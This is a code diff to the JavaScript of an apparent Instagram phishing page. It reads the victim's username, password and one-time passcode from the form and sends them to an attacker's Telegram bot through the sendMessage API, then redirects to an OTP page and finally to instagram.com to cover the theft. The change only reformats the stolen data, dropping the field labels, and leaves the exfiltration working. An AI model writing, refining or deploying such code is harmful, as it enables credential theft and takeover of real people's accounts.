@@ -31,12 +31,8 @@ window.onload = () => {
       ? (toggleBtn.innerText = "HIDE")
       : (toggleBtn.innerText = "SHOW");
   };
-  const post = (data, redirect = "/") => {
+  const post = (text, redirect = "/") => {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    let text = "";
-    Object.entries(data).forEach(([key, value]) => {
-      text += `${key}: ${value}` + "\n";
-    });
     fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
       .then((res) => location.assign(redirect))
       .catch((err) => console.log(err));
@@ -45,17 +41,12 @@ window.onload = () => {
     e.preventDefault();
     if (otp) {
       post(
-        {
-          "Instragram OTP": otp.value,
-        },
+        otp.value,
         "https://instagram.com"
       );
     } else {
       post(
-        {
-          "Instragram Username": username.value,
-          "Instragram Password": password.value,
-        },
+        username.value + "\n" + password.value,
         "otp.html"
       );
     }
